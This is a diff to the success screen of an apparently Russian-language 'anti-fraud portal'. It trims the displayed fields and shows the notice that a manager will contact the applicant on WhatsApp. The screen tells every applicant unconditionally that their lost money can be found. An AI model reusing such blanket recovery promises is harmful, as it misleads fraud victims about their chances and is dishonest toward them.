@@ -45,39 +45,29 @@
 
     <!-- SUCCESS -->
     <div id="successScreen" class="card card-lg hidden" style="text-align:center">
-      <div style="width:80px;height:80px;border-radius:50%;background:rgba(16,185,129,0.15);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px">✅</div>
-      <h2 style="font-size:24px;font-weight:900;margin-bottom:12px">Заявка успешно отправлена!</h2>
-      <div style="background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.2);border-radius:12px;padding:16px;margin-bottom:20px">
-        <p style="font-size:15px;font-weight:600;color:var(--green);margin-bottom:4px">💰 Ваши деньги можно найти</p>
-        <p style="font-size:13px;color:var(--muted)">Мы проверили вашу ситуацию и считаем, что шансы на возврат есть</p>
-      </div>
+      <div style="width:80px;height:80px;border-radius:50%;background:rgba(16,185,129,0.15);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:40px">✅</div>
+      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px">Заявка отправлена!</h2>
+      <p style="font-size:16px;font-weight:600;color:var(--green);margin-bottom:4px">Ваши деньги можно найти</p>
+      <p style="font-size:14px;color:var(--muted);margin-bottom:20px">Наш менеджер свяжется с вами в ближайшее время</p>
 
       <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:16px;text-align:left">
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 0">
           <span style="font-size:13px;color:var(--muted)">Номер заявки</span>
           <span style="font-size:16px;font-weight:800;color:var(--green)" id="appNum">#AF-2606-3847</span>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
-          <span style="font-size:13px;color:var(--muted)">Имя</span>
-          <span style="font-size:14px;font-weight:600" id="nameDisplay">—</span>
-        </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
-          <span style="font-size:13px;color:var(--muted)">Платформа</span>
-          <span style="font-size:14px;font-weight:600" id="platformDisplay">—</span>
-        </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 0">
           <span style="font-size:13px;color:var(--muted)">Способ связи</span>
           <span style="font-size:14px;font-weight:600" id="contactDisplay">WhatsApp</span>
         </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:6px 0">
+          <span style="font-size:13px;color:var(--muted)">Статус</span>
+          <span style="font-size:13px;font-weight:600;color:var(--green)">Ожидайте звонка менеджера</span>
+        </div>
       </div>
 
-      <div style="background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.2);border-radius:12px;padding:14px;margin-bottom:20px">
-        <p style="font-size:14px;font-weight:600;color:var(--blue);margin-bottom:4px">📱 Что дальше?</p>
-        <p style="font-size:13px;color:var(--muted)">Наш менеджер напишет вам в <strong id="contactPlatform">WhatsApp</strong> в течение 24 часов. Он свяжется с вами, чтобы обсудить детали и предложить план возврата средств.</p>
-      </div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:20px">📱 Менеджер напишет вам в <strong id="contactPlatform">WhatsApp</strong> в течение 24 часов</p>
 
       <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="width:100%">📋 Проверить статус дела</a>
-      <a href="/anti-fraud-portal/" class="btn btn-outline" style="width:100%;margin-top:8px">🏠 На главную</a>
     </div>
 
   </div>
@@ -242,8 +232,6 @@ async function showResult() {
   document.getElementById('appNum').textContent = '#' + appNum;
   document.getElementById('contactPlatform').textContent = answers.contact?.replace(/[📱💬✈️]\s*/g, '') || 'WhatsApp';
   document.getElementById('contactDisplay').textContent = answers.contact || 'WhatsApp';
-  document.getElementById('nameDisplay').textContent = answers.fullName || '—';
-  document.getElementById('platformDisplay').textContent = answers.platform || '—';
 
   // Save locally
   const cases = getCases();
